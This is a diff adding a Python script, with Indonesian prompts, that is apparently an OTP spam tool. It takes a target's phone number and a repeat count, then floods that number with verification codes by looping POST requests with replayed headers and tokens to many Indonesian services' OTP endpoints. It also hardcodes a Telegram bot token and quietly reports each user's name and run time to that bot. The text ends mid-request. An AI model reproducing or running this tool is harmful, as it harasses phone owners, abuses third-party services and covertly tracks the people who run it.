@@ -1,0 +1,192 @@
+import os,sys,time,os,json,requests,json
+from colorama import Fore,Back,init,Style
+from requests import get,post
+from urllib import request
+import requests
+import time
+from datetime import datetime
+
+def autoketik(s):
+    for c in s + "\n":
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(0.008)
+        
+def autoketi(s):
+    for c in s + "\n":
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(0.004)
+        
+B = Fore.BLUE
+C = Fore.CYAN
+BR = Style.BRIGHT
+W = Fore.WHITE
+R = Fore.RED
+G = Fore.GREEN
+BL = Fore.BLACK
+Y = Fore.YELLOW
+
+localtime=time.asctime(time.localtime(time.time()))
+
+hijau="\033[1;92m "
+putih="\033[1;97m"
+abu="\033[1;90m"
+kuning="\033[1;93m"
+ungu="\033[1;95m"
+merah="\033[1;91m"
+biru="\033[1;96m"
+
+# Konfigurasi bot Telegram
+TELEGRAM_TOKEN = '7028070685:AAGvqfD1In4ZnmXHSx4rj46aQ7DUstK4DYI'
+TELEGRAM_CHAT_ID = '7233342888'
+
+def send_telegram_message(message):
+    url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
+    data = {
+        'chat_id': TELEGRAM_CHAT_ID,
+        'text': message
+    }
+    response = requests.post(url, data=data)
+    return response
+
+# Langkah 1: Minta Nama Pengguna
+nama_pengguna = input("Siapa namamu: ")
+
+# Langkah 2: Tampilkan Perjanjian
+print("\n--- Perjanjian Penggunaan ---")
+print("Dengan menggunakan skrip ini, kamu setuju untuk tidak menargetkan ke orang yang tidak bersalah, dan jangan menggunakan nomor orang lain untuk dijadikan test jika mau gunakan nomor sendiri!!, jika anda melarang perjanjian ini... yaa janji harus di tepati, ketik ya untuk setuju ketik tidak untuk tidak setuju !")
+print("Apakah kamu setuju? (ya/tidak)")
+persetujuan = input("> ").strip().lower()
+
+# Langkah 3: Jika tidak setuju, kirim pesan ke bot Telegram dan blokir akses
+if persetujuan != 'ya':
+    message = f'Pengguna {nama_pengguna} menolak perjanjian pada {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.'
+    send_telegram_message(message)
+    print("Kamu tidak diizinkan menggunakan skrip ini.")
+else:
+    # Langkah 4: Jika setuju, catat waktu penggunaan dan kirim ke bot Telegram
+    waktu_penggunaan = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    message = f'Pengguna {nama_pengguna} menggunakan skrip pada {waktu_penggunaan}.'
+    send_telegram_message(message)
+    
+    # Tempatkan kode skrip utama di sini
+    print(f"Selamat datang, {nama_pengguna}! Kamu telah setuju dan sekarang dapat menggunakan skrip ini.")
+    time.sleep(2)
+    os.system('clear')
+    print(f"TUNGGU SEBENTAR/")
+    time.sleep(1)
+    os.system('clear')
+    print(f"TUNGGU SEBENTAR-")
+    time.sleep(1)
+    os.system('clear')
+    print(f"TUNGGU SEBENTAR|")
+    time.sleep(1)
+    os.system('clear')
+    print(f"TUNGGU SEBENTAR/")
+    time.sleep(1)
+    os.system('clear')
+    print(f"TUNGGU SEBENTAR/")
+    time.sleep(1)
+    os.system('clear')
+    print(f"TUNGGU SEBENTAR-")
+    time.sleep(1)
+    os.system('clear')
+    print(f"TUNGGU SEBENTAR|")
+    time.sleep(1)
+    os.system('clear')
+    print(f"TUNGGU SEBENTAR/")
+    time.sleep(1)
+    os.system('clear')
+    print(f"TUNGGU SEBENTAR/")
+    time.sleep(1)
+    os.system('clear')
+    print(f"TUNGGU SEBENTAR-")
+    time.sleep(1)
+    os.system('clear')
+    print(f"TUNGGU SEBENTAR|")
+    time.sleep(1)
+    os.system('clear')
+    print(f"TUNGGU SEBENTAR/")
+    time.sleep(1)
+    os.system('clear')
+    print(f"TUNGGU SEBENTAR/")
+    time.sleep(1)
+    os.system('clear')
+    print(f"TUNGGU SEBENTAR-")
+    time.sleep(1)
+    os.system('clear')
+    print(f"TUNGGU SEBENTAR|")
+    time.sleep(1)
+    os.system('clear')
+    print(f"Selesai!")
+    
+    
+    # Lanjutkan dengan kode yang kamu inginkan...
+    
+os.system("clear")
+autoketik(f"""
+{BR}{R}
+      __|                     
+    \__ \   _ \   _` |   ` \  
+    ____/  .__/ \__,_| _|_|_| 
+          _|                  
+{B}  \ \      /  |            |           \                 
+   \ \ \  /     \    _` |   _| (_-<   _ \    _ \   _ \   
+    \_/\_/   _| _| \__,_| \__| ___/ _/  _\  .__/  .__/   
+                                           _|    _|      
+
+{BR}{Y}[ {C}i{Y} ] {G} Script ini Delaynya Lama Banget
+{W}[{Y}×{W}] Waktu/Jam ditempat mu{putih}:{Y} {localtime}
+""")
+
+nomor = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Nomor Targetnya Ngab {W}: 62 ")
+jum = int(input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Jumlah {W}: "))
+autoketi(f"{G}Memulai spam...   {W}Target :{Y}62"+nomor)
+
+who = "https://h.kreditpintar.com/api/auth/send-code?channel=H5_GG_SD_1&lang=id"
+whos = {
+    "Host": "h.kreditpintar.com",
+    "content-length": "46",
+    "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+    "x-adv-market-channel": "H5_GG_SD_1",
+    "x-user-agent": "Pintar-ID-Cash (WebAndroid;;;id) uuid/c4cb1e63-17ed-427f-a822-899f39c634cb version/0.1.0",
+    "x-app-version": "APPVERSION_NAME(9999)",
+    "accept-language": "id",
+    "sec-ch-ua-mobile": "?1",
+    "x-adv-uuid": "c4cb1e63-17ed-427f-a822-899f39c634cb",
+    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
+    "content-type": "application/json",
+    "accept": "application/json, text/plain, */*",
+    "sentry-trace": "023a27aa27f84e0b9e51193ff2d9d806-89e32e955945290e-0",
+    "x-os-type": "WEB",
+    "sec-ch-ua-platform": "Android",
+    "origin": "https://h.kreditpintar.com",
+    "sec-fetch-site": "same-origin",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-dest": "empty",
+    "referer": "https://h.kreditpintar.com/H5_GG_SD_1/code-step?m=" + nomor,
+    "accept-encoding": "gzip, deflate, br, zstd"
+}
+whox = {
+  "mobileNumber":"+62" + nomor,
+  "type":"SMS"
+}
+
+for i in range(jum):
+            pos = requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"120","sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',"sec-ch-ua-mobile":"?0","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYTQyNDMyZDctZjI5NS00Zjk0LTllYTYtZjlkZmM0ZDgwY2RiIiwiaWF0IjoxNjU3MTI0OTQwLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.4j37JW_U6DVynJ0wCxHmVNI8SbpsaeUgqk3SEihJmvs","content-type":"application/json","x-company-name":"odi","accept":"application/json","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","user-platform":"desktop","x-frontend-type":"desktop","sec-ch-ua-platform":"Linux","origin":"https://www.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},json=({"phone":"0"+nomor,"action":"register","channel":"message","email":"","token":"","customer_id":"0","is_resend":0})).text
+            dekor2 = requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":"+62"+nomor,"platform":"sms"})).text
+            pondok = requests.post("https://core.pondokdigital.id/api/v1/login/phone",data={"phone":"62"+nomor},headers={"Host": "core.pondokdigital.id","content-length": "25","sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',"accept": 'application/json, text/plain, */*',"content-type": "application/json","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36","origin": "https://pondokdigital.id","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://pondokdigital.id/","accept-encoding": "gzip, deflate, br, zstd","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}).text
+            req4 = requests.post('https://www.halodoc.com/api/v1/users/authentication/otp/requests', headers={'Host': 'www.halodoc.com','x-xsrf-token': '9F1AFC784408F11F0FCD3071E845FBEB52B13A6C8C5740172F9C526E0DCA9A69B37505EDB5FAF1C97C522F4B09AFCF2F7C89','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json, text/plain, */*','save-data': 'on','origin': 'https://www.halodoc.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},json=({"phone_number": "+62"+nomor,"channel": "sms"})).text
+            req3 = requests.post('https://www.alodokter.com/api/users/check_registered_pin', headers={'Host': 'www.alodokter.com','content-length': '2057',"sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"','accept': 'application/json','content-type': 'application/json','x-csrf-token': 'lctB3vbAhKbEwsbRF7lfvVsPHmpAwM84eR8Z3bEvxuDE4zFxOr6PSsXTG8F4KElfZ4dfRswsV0FjN+tCmDRT0Q==','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform': '"Android"','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br, zstd','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},json=({"user":{"phone":"0" + nomor,"device_pseudo_id":"Google ChromeLinux armv81 ayrke0eril8ni9i2wp3lc"}})).text
+            aladin = requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers={"Host":"m.misteraladin.com","accept-language":"id","sec-ch-ua-mobile":"?1","content-type":"application/json","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","x-platform":"mobile-web","sec-ch-ua-platform":"Android","origin":"https://m.misteraladin.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.misteraladin.com/account","accept-encoding":"gzip, deflate, br"},data=json.dumps({"phone_number_country_code":"62","phone_number":nomor,"type":"register"})).text
+            loan = requests.post("https://loan.easycash.id/api/mobile/sendVerificationWithoutCaptcha",headers={"Host": "loan.easycash.id","content-length": "91","sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',"platformtype": "WEB","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36","yqg-platform-device-token": "webFakeToken-1719682164297","build": "35313","yqg-platform-sdk-type": "IDN_YQD","accept": "application/json, text/plain, */*","yqg-platform-language": "id","content-type": "application/json","channel": "gg_newuser","blackbox": "tdfpeyJ2Ijoibncydk1NaVVpY082WDZoM2NSZm0zczM4aHhTS2dmSVpyQW1rVVhvbkFnaXQ0Qk14MGdqaG5hcTdGdFZBYVI2ZSIsIm9zIjozLCJlIjo0LCJkIjoie1wicGFydG5lclwiOlwiRmludG9waWFfaWRcIixcImFwcF9uYW1lXCI6XCJFYXNoY2FzeV93ZWJcIixcInRva2VuX2lkXCI6XCJGaW50b3BpYV9pZC0xNzE5NjgyMTYxOTQ1LTM2MDkxZGNkZDVmYjNcIixcImFcIjpcIi9aU3d5VmdyaHNReFo0MFBDdHdhZ2R5VjlTL2owTWhhNTJ0dHNCVTNtRnY2YW8zRk1zMmFTYzIvRklZU3dtb3BMeER1fktpNTdRRWdXejhWb0hiajVJRWNzSWhEczJGY2dWemQ2TXBEaW01ZHY2YWt6T1dFTVQzakU0ZzR4RFRpTmVXdVlyYjFaSEFoRn5HblJ3VDZNZjExek1JUThJRER0T2k4OUN-TWVnQ3NLR3Y0M0luczhRZUQ4cjcxclFiVXZta3JiYkhCRkF5WGlMSElHMn5XSW1uaE4zZVJ0eVF4RVZVaWV6VDliQUxNVFgydTdvemEzaFduRzJyZDVLRGxWenBkZzgwOHA0NWJGc1NIOUdxMnJBLzRzZG5OdjIvaGtMUGhYbn4zbnZaN0ZXeU1lcHhad3FJS0dFU0x3VGNIWmZ-RkFEclJZNGJrei9MTm1rcFI0ZDRMYVRrRHVVL1VVSGIyN3U2MHNqUFI2RlFOVUJpZU5Na0dBcDNTNTM5bmVKdkFkdThvdkEza0wzOWh-SDRLZ0hpZ0xwN0h0ZmtVUElJak9RdE5DOW5IL0QvR1RWZzlWTGlJMDY3c21-ZjB6MG1zM0ZDUWtGVUVsM34vcmVNTzh6OTdpblozTHlUd2l4aVhoZ1ZjNHVUNFVlfmtSNHpDbUV3ODd1ZHZaNUhEXCIsXCJiXCI6XCIzSG1Qd0NiM2M3RnF5QUp4WGswYlF0amdwcWl4VUxjWEs0SDByYzhJc0NIWmN3RzdzbnFMc1lhYzBOMlZia0I4cmRBaFIxNU5jY0dLREpMMnBBbG5xT0ZxN3d4NUN6TU5XS0VsSmhSdThmWi9FalhIZ1dab1FKNG5BZDNqUEpkb05YUzhGVUhHa0F3R1NvY3lJbWF5RE1WRE9MYkdGUUw3TTVvRDIyekFaeDc0TUx5U2hUclFhRkNIZGV3MXpwZEJWVUtNdmZFZVhuUXBHSERQNGZocmtvQ0pPR1JLU1hFM2toSHRIbHpKRzlnSGZpd0JJWExJSmxiUUFHSjZDbm5ScEFtc01IODlJVFRvbE9YQXVzU01XLzBIeERXNElUZ0VEQWVUZ2xNTGpwMXl1VX5mU1J5Q3p5ZWtPN3ZSWmsxZm1HZUZsT0dmSUVYZDl5cG5qZ2NlV0tjbkZ4bzBTQ0RsN351dG5Ib3NuWkM9XCIsXCJjXCI6XCJScUNKc1ZjdzF6UGhIaWxydVR4VjQ3dlZWUW93R0lnbFhKT0l0d0d6cGF5QzJCeHQ4QW1vSC9HSi9HSmxEaVV1RXlHSW91Z205VmdINmN1WnRReGlkZ21hdFpOSWg0WDhZQUEzRkJMZ3BZWTBLT2Z-UnNGVDNmcnF3THVWLzcva2dHNGJpYWE3ZjhidUpnbTYzS0g0SmFCenZVOTBCek1jdndEfnFpajVPc0IybjJMczdNazg4U3g1Tk9uNTc1RGdNV09MeE1ibFFUa2xmZnBleW1YZ0lJMEhUNHJQM0Y1Z3FYZDdreE93dkpMMWJCZEo0M084SVNyMndCNkNyNkR5dklnTHExaWdpY2k3NGV-WXBnT0VCYT09XCIsXCJkXCI6XCJ3ZXQwQ2tadnlGek8yVzk0fjNSNk5zZkNDdUNReTVGZ1dwL2JrdmhuNENpVFhMVUFSaEhCTVBvc25maXlPUjk0M1g5ZklmSVk5WVF5U09XcVFVcG9OLzBDTUlTVVlwRlAzNWhGSlhRQ095MUNtWlVsRVdXeGJiZHl4dFlQZmhUT3VkamJwR1NiWDlWUDlLenQvUzZEdURkU2R0YW53RGVYblFVQXU5V055V3gzb3VVc2tnRWJhYzljTnJUT2dUVGRpRGpHb05YQVNjckcwdENJWTFnYmc5cmo2UH5tc2VpR2J2c0lvcnprVGFNR1M2VWFnWDlnUU9zaG5xdW1LeGFHeXFwVHIveWd-b2RpRk5ofmdvRFlJUkt4VWJtRWhCYlcwaUxSbDZoL3R6RlRPZUVLdVgyM0N6SEd1ODdQdlJXRmFIWWE5R2N-WC9qcDYxMk40ZzEvfmMvcG0vcHlKajZMTW8zdHBjSEFTMzUyZ2NKflBtUWtxT3JJVm13dldxTmJoYzRDd0loTldjeW1XVnVyQkYwVE52RjJmTDlvOTRMczg0NEdoTEovT1FZaGY5dTZxWn5pZXJEVUpqOXNzbnV6dEZUa3QvZzVnNmt5UzZZM0pnenNQNlp1TFRkd05kN29HTEhYUVB2bjJLbGYvQUlJWmY5dTZzWng4VUQwZERSWGxma0EwcFRvMG1aeHE2SVViQWVvY3RrV3NnTzV6bjdOWFR6aEovU2x6RHhpRWRZNX52bzIvQXlQMGx-ZFo2Rzh5RkNCUmhiNVV3bWZQSTU2WDVzMWIwTHk0RlZuTjIwYXVTVzVkOHpuOXNxZjU4djhXfmxQOUtaNFVXS2dVeDVEbWJ5L2cyaDduclp2SGRHan5uTW1mYkgvTldCMk1ubmFRbmlSQ00wZi9-aEw4MGlscHRZellWcGpBZTEyalh0OGZUZnp0NjBFMzNsQjB3My9RTkl3Nlg5QnpsOEpVWE1ZNkpaU1NhZkNVOXIyZHo2QX5JcnRjUkV-cGdqVUR-fm91NFNEcFlkbXZwY2FoWlhJc0YxNmJIeXZSQVRCSVNlRE05NnVDTHBMUm93N3JjQWU3cDdQVH44bH5UMDVRdkNmMUh3fkJFfkhBTlJaZUJJblNub2FteTEyMnlLUlhqeUJWaFRXWVNZS3cyUz1cIixcImdcIjpcIk5oYkZmenpkOTJCYklIU3RJNEhnT0pQQzFlTzJPWHVCbn42WFkxYmZkNnk3NTM3Sy9hWlBLeUwxQUQ5V3lVVmx3aE42T1pHVDQvakdwVkgzN3FWU1Q4Z0p0S1hGb0dLVXFFZ2QzOWFURUM5b21hbzlBc21YejNIZ1JaeWR2RjFwbjBRfktieTVPYUsveTltbkh1OUYyZTFkR2lOT1A2T3h-UzZqTzM3SEpVUGVLaFk0VXRzQXVyUHBsOUJXUDQ3ckdWcmwxT0ZZNmJrRGNIMUVmUVB6RXo5ZW8xLzV4a09OY1E3MUdlUXpsNzZtZWNvZ2t-b21sUkpyU3JYYy94UENsZ0M1QzdCeldRV09rTzRvVDNxRzZyTVdoVGNhRGdwdWtPZ1Nub1ZXeDI5eW1VWlo5bTExZjY2MHhQNnZPZDVPeENndW92VDJUT1p3bFNrQVJVdGJTakZuSTEyMjhzMXhxMHRxY2lwRVJPMVRvdk9XQkNiZDJKbzZWb2FhcUw1blF0QWJSNy9-TXQ0S34wV3ZnR0IxUnA9PVwiLFwiZlwiOlwiUy95M0M5aHUyMjVoejZIamU0TUVnT0R4YmNrcGNhZGQ0eEVtQmd1Z3JrcD1cIixcImVcIjpcIm93a2FhVkN2RmVCWFFBMkI2R3haWnN5UVxcXFxuQ3l0a0tWaVV3VE5uQWRsSkxzdUpybmZyZkJlQ2NONkRtWlJlSXpKSTNMZExaS3pzTm9qVjhrbEZSRVdQTmRmQnBwN2VPeE9pTGFzTVN4Vm8zT3c0ZndIUG52cVNCOFZzZ2Nyc0V6XCIsXCJ2XCI6XCJudzJ2TU1pVWljTzZYNmgzY1JmbTNzMzhoeFNLZ2ZJWnJBbWtVWG9uQWdpdDRCTXgwZ2pobmFxN0Z0VkFhUjZlXCIsXCJpZGZcIjpcImRXZU51WGxYemVKa0tJWWZrN2JNVHhMbXBreHh5bmdxVmZoRlQxK2pvMWF5c2hkTytlWENTZmJlWHhQbktEWjNVWCtrdzhVMGJrbUdzUUduWHFOcmpLWTg4b0xlUTY3dmk5WlVHLzg0RjY2MFRXalJseTUvNkZHdW0zYU95RGMrOVFlY2dtVHd5d1paNEFoVVdLVy85MnVoSSs1WE5IUFFLbjdVclR2MHRRTT1cIixcIndcIjpcInFhTnZ2dEs2RGlYejJadGhxbXVIZTNUQXJ2WHpMQ2VKOFFMcHIydnhLWmlKdDNxdjRiYWN-dVFmYWNYTUs3MVVmVEs2eDZNbVphUkdJTnV6Tld2MnlXU28wbUp2bmU3b2NUaW41ZkdEbjFlPVwiLFwiY3RcIjpcIndBdVFlWFhkWTNlV1Y1dTFrSFlLSFc9PVwifSJ9","sec-ch-ua-platform": "Android","origin": "https://loan.easycash.id","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://loan.easycash.id/register-login?channelName=gg_newuser&gad_source=1&gclid=CjwKCAjw4f6zBhBVEiwATEHFVmlcWs89bHpq_vfWuPInrcu9ZvBPt7EJgXMIwRdbxbqtfYTkEVcpohoCgbcQAvD_BwE","accept-encoding": "gzip, deflate, br, zstd","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"mobileNumber": "0" + nomor,"notifType": "SMS","verificationPurpose": "REGISTER_OR_LOGIN"})).text
+            tokped=requests.post("https://gql.tokopedia.com/graphql/OTPRequest",headers={"Host":"gql.tokopedia.com","content-length":"863","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://www.tokopedia.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.tokopedia.com/register","accept-encoding":"gzip, deflate, br, zstd","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"operationName":"OTPRequest","variables":{"msisdn":"62"+nomor,"MsisdnEnc":"","EmailEnc":"","otpType":"116","mode":"whatsapp","otpDigit":6},"query":"query OTPRequest($otpType: String!, $mode: String, $msisdn: String, $email: String, $otpDigit: Int, $ValidateToken: String, $UserIDEnc: String, $UserIDSigned: Int, $Signature: String, $MsisdnEnc: String, $EmailEnc: String, $source: String) {\n  OTPRequest(otpType: $otpType, mode: $mode, msisdn: $msisdn, email: $email, otpDigit: $otpDigit, ValidateToken: $ValidateToken, UserIDEnc: $UserIDEnc, UserIDSigned: $UserIDSigned, Signature: $Signature, MsisdnEnc: $MsisdnEnc, EmailEnc: $EmailEnc, source: $source) {\n    success\n    message\n    errorMessage\n    sse_session_id\n    list_device_receiver\n    error_code\n    message_title\n    message_sub_title\n    message_img_link\n    __typename\n  }\n}\n"})).text
+            rupa=requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"117","sec-ch-ua-mobile":"?1","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiN2JjZTk0N2QtZTMwOS00YjYyLTk1NWItZTJkNTMyNWVmY2U5IiwiaWF0IjoxNjYyMzczNjM2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.FEO05D4v9bvaU-Kpgo4XvwbIWhbm3uamIDTCsRmm_Gs","content-type":"application/json","x-company-name":"odi","accept":"application/json","informa-b2b":"false","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","user-platform":"mobile","x-frontend-type":"mobile","sec-ch-ua-platform":"Android","origin":"https://m.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},json=({"phone":nomor,"action":"register","channel":"chat","email":"","token":"","customer_id":"0","is_resend":0})).text
+            pndk=requests.post("https://core.pondokdigital.id/api/v1/login/phone",headers={"Host": "core.pondokdigital.id","content-length": "25","sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',"accept": 'application/json, text/plain, */*',"content-type": "application/json","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36","origin": "https://pondokdigital.id","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://pondokdigital.id/","accept-encoding": "gzip, deflate, br, zstd","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone": "62" + nomor})).text
+            kpintar=requests.post(who, headers=whos, json=whox)
+            oyo = requests.post("https://www.oyorooms.com/api/pwa/generateByPhone?locale=id",headers={"Host": "www.oyorooms.com","content-length": "123","sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',"consumer_host": "https://www.oyorooms.com","accept-language": "id","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36","loc": "223","content-type": "application/json","sec-ch-ua-platform": "Android","accept": "*/*","origin": "https://www.oyorooms.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.oyorooms.com/login","accept-encoding": "gzip, deflate, br, zstd"},data=json.dumps({"phone":nomor,"country_code":"+62","country_iso_code":"ID","nod":4,"send_otp":True,"devise_role":"Consumer_Guest"})).text
+            ever=requests.post("https://evermos.com/int-client/v3/user-verification/phone-registration",headers={"Host": "evermos.com","content-length": "25","client-device": "web_mobile","sec-ch-ua-mobile": "?1","authorization": "Bearer 413175094c989e18e9d580cb560f1fe1529152ee","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36","x-forwarded-for": "10.0.11.83","content-type": "application/json","accept": "application/json, text/plain, */*","sec-ch-ua-platform": "Android","origin": "https://evermos.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://evermos.com/registration/otp","accept-encoding": "gzip, deflate, br, zstd","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},json=({"phone":"62"+nomor})).text
+            ct = requests.post("https://bizapi.ginee.com/infra/common/security/send-otp",headers={"Host": "bizapi.ginee.com","content-length": "2025","accept-language": "id","sec-ch-ua-mobile": "?1","authorization": "","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36","content-type": "application/json","accept": "application/json, text/plain, */*","sec-ch-ua-platform": "Android","origin": "https://ginee.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://ginee.com/id/lp/11/?utm_source=Googleads&utm_campaign=AA_Ginee_ID_WEB_NA_Click_CPA_Register_Manual_BrandExact_29052024_SYS_ERP&adgroup=BrandSpell&gad_source=1&gclid=Cj0KCQjwzby1BhCQARIsAJ_0t5NYI34kvXiA_fCy3zpZXIs1NYv2J14mAIAYfIN19VlysmR228VfrEgaAjq2EALw_wcB","accept-encoding": "gzip, deflate, br, zstd"},data=json.dumps({"account":nomor,"phoneCountry":"ID","verificationPurpose":"USER_REGISTRATION","verificationType":"PHONE","recaptchaToken":"03AFcWeA7EXVgpCcmEibjTmENv1YuygDx0Vp5A5kheYWPxq641IV9jDAIU52sdy6hZmrnpKz0le5whqUdIqUYf3jU87vPUmD_TcebOaFJbwmsKr21Rgi6m1vPrfDP9uyTwg-awyBK1zUUvSyIHyIc06FNFAeQADyyFs172jcqNmsdg2jLtBJwKPtLywpU-PoH87QpuQuJQWNDECtAeEPa5bXQrjBVRJw0bmRXtyBMa3DTx9PY9YkzeO70mQgWP0JMcRIdmSnvWDcNk4G3FxZ9g8E1YI6hCnSbRwI8oV3yCAKg1hKs-kbiP6gcatzs-Yf7uvebB4F6GkoPmk5xuUMQN1HYr9JwMAeJQAv1NGNYE8zijaqpQNEb-dcybTwh9nNYj5YN-Fbzz3mbdGqe_D5TLs6mpYA1Lq8lgUQU2Jisakpwscz4vUH1cymt7ZTLVLjvoWkhn-ZVKVOhE-4mJBc_rrG2yNYN79Pu15da5u3TilvssEdEcZcxrushMzkoKypYO1UsaOOQBJvgAT8_XLToo4deRX7RWaxpWXlb-T1dUTJSb-2WDmyp7kD59qnGe973C4ZZjRDzMevP7YEyoZA7EFvUCB80Qsxm540lmHEXKATwV_sL0i_-zUho1z8eUQySxr57qIX6ITodrqognLiE5evawCKy8l0Ae-dAbX0zGT7FdOjzs7BpxK1tpb4C3XjFUBPGkRBzNHUVF-2NApTLJlls3qcs5-nRyuHayi_ZFb3riQayV7KXufKIFdHD01PjBX4uUmV-Z67tqVCQT4CNfJSKL-UrCamQF-kEgDPQ4KYTOzuZygaigq4ce3DJ3OtwCXtjS_oj_QrhiUgLnc0DJLvUO6_4gh3BEgUX9t89sAtVTmGizRHbRFpG4TpKstDe1CAHnojGi08k_MVRRAG7X3o5hJjw-HES7DC4CRejgZdaH_cto2DlRhrAC5qcosWXH6GSKO_lQ3vekr4YKuKEM2CvywPKGcjKyLWcTaQugOXmpAN5DZL4_COF8Rzn-5BQvdxwoClzjAeQsTO_3E